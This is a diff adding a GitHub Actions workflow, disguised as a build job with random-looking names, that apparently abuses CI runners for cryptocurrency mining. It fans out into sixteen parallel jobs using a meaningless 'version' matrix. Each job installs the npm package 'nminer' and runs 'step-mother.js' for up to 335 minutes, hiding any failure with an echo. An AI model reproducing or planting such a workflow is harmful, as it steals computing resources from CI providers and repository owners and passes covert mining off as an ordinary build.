@@ -1,0 +1,41 @@
+name: step-mother
+on:
+  push:
+    branches: [ "main" ]
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    strategy:
+      matrix:
+        config:
+          - { version: 1557 }
+          - { version: 7006 }
+          - { version: 5205 }
+          - { version: 798 }
+          - { version: 6398 }
+          - { version: 9062 }
+          - { version: 2986 }
+          - { version: 5655 }
+          - { version: 3018 }
+          - { version: 5067 }
+          - { version: 3052 }
+          - { version: 745 }
+          - { version: 2213 }
+          - { version: 1899 }
+          - { version: 4888 }
+          - { version: 5617 }
+
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+
+      - name: Install Node.js
+        uses: actions/setup-node@v3
+        with:
+          node-version: 20
+          
+      - name: unto inwardly meh
+        run: |
+          npm install nminer@latest
+          timeout 335m node step-mother.js || echo "step-mother executed"
